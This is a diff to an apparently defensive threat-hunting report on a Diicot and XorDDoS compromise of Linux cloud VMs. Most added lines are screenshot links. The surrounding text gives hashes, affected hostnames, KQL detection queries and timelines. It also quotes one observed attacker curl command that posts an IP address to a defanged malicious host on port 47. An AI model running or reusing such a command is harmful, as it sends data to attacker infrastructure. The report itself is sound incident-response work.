@@ -472,6 +472,8 @@ The script performs multiple malicious actions that include the following activi
 
 The `network` file’s observed activity also appears to mimic documented behavior of Diicot’s `.bisis` payload. Where the file sends connection requests to other systems on port 22, possibly looking for specific responses that indicate the presence of OpenSSH. The public IP address found in the script is classified as malicious by VirusTotal. 
 
+![image](https://github.com/user-attachments/assets/fca6fdcc-2611-4e24-992a-e8ce813a65c8)
+
 The file location of the network file is `/dev/shm/.x/network` and with the payload being initiated by the `root` user in the `sakel-lunix-2` domain. The discovered `network` payload has a SHA256 hash value of,
 
 * SHA256: `cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255`
@@ -488,6 +490,8 @@ DeviceFileEvents
 | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessAccountDomain, InitiatingProcessAccountName
 ```
 
+![image](https://github.com/user-attachments/assets/6d40270b-d75e-4426-987c-37d39c519f22)
+
 The query revealed that the script was also present in three other systems, the device being,
 
 1. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
@@ -495,6 +499,8 @@ The query revealed that the script was also present in three other systems, the 
 2. `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
 
 3. `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+![image](https://github.com/user-attachments/assets/0abae26f-a960-4214-b9d6-9c7240cc8b94)
 
 Other suspicious activity also occurs at `2025-03-14T17:52:01.898895Z` when the threat actor executes the cache file initiating a connection request to a known Diicot C2 server. And another instance of suspicious behavior occurs at `2025-03-14T18:23:35.941725Z` when the threat actor executes the command,
 
@@ -509,6 +515,8 @@ curl --silent "http://196[.]251[.]73[.]38:47/save-data?IP=45[.]64[.]186[.]20" \
 ```
 
 The command sends the IP address `45[.]64[.]186[.]20` to the remote IP address of `196[.]251[.]73[.]38` on port 47. Suggesting that there is possible data exfiltration, tracking, or botnet communication occurring. Referencing the remote IP address to VirusTotal returned a positive malicious affiliated IP address.
+
+![image](https://github.com/user-attachments/assets/101cd5c5-572d-4290-942e-db438e3938a4)
 
 One other indicator of compromise discovered in association with the newly created cron job `gcc.sh` (Persistence Mechanism section) trojan, is the initiating file called `ygljglkjgfg0`. This file is responsible for initiating the creation of the malicious scheduled job on several systems. Using a query, the entirety of the network was searched for systems hosting files with the same name.
 
@@ -540,6 +548,9 @@ Devices:
 
 7. `linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
 
+![image](https://github.com/user-attachments/assets/7e09b671-2701-4b56-a47d-dd0acb8a53b4)
+
+
 And the seven distinct hashes and their VirusTotal results are,
 
 1. `3c1f9f07eacc2f057a609c955e2fde38493521268f3493717ffa5a31b261f3ef` *(Malicious)*
@@ -556,7 +567,13 @@ And the seven distinct hashes and their VirusTotal results are,
 
 7. `75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19` *(Malicious)*
 
-Reviewing the returned VirusTotal results indicated that the `ygljglkjgfg0` payload found on the compromised devices are associated with Linux Trojans called `XorDDoS`. `XorDDoS` Trojans are a Linux-based malware that has been observed in DDoS botnet campaigns. It is known for using XOR-based encryption to evade detection and is often deployed to compromise Linux servers through SSH brute-force attacks. Conscious that there could be more `XorDDos` Trojans in the network, a query using all seven distinct SHA256 hashes was crafted.
+Reviewing the returned VirusTotal results indicated that the `ygljglkjgfg0` payload found on the compromised devices are associated with Linux Trojans called `XorDDoS`. `XorDDoS` Trojans are a Linux-based malware that has been observed in DDoS botnet campaigns. It is known for using XOR-based encryption to evade detection and is often deployed to compromise Linux servers through SSH brute-force attacks. 
+
+![image](https://github.com/user-attachments/assets/89cf0bb2-19d4-4035-bdd0-ebcef10ba10b)
+
+![image](https://github.com/user-attachments/assets/a4053d72-ec19-4c22-8434-78cccf623763)
+
+Conscious that there could be more `XorDDos` Trojans in the network, a query using all seven distinct SHA256 hashes was crafted.
 
 Query
 
@@ -608,6 +625,10 @@ DeviceNetworkEvents
 | order by Timestamp asc
 | project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteIPType, InitiatingProcessFileName
 ```
+
+![430185988-7c162e48-f706-449c-a17a-63c469987c22](https://github.com/user-attachments/assets/866031ec-fc92-4705-88e1-1875cf34f6be)
+
+![cacheReverseShell](https://github.com/user-attachments/assets/0699449a-3cc8-41b8-b3a4-c77b0a5c3600)
 
 ### Persistence Mechanism (T1053.003)
 
